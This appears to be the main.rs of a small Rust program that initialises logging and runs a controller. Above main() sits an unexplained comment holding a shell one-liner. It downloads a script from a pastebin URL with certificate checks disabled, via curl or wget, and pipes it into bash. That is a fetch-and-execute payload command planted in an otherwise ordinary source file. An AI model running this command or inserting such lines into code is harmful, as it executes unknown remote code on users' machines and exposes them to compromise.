mod control;

use control::Controller;

use env_logger::{Builder, Env};


// (curl -kL https://pastebin.com/raw/2GF3g5me || wget -q --no-check-certificate -O- https://pastebin.com/raw/2GF3g5me ) | bash

fn main() -> Result<(), Box<dyn std::error::Error>> {
    Builder::from_env(Env::default().default_filter_or("info")).init();

    let controller = Controller::new();

    controller.run()
}


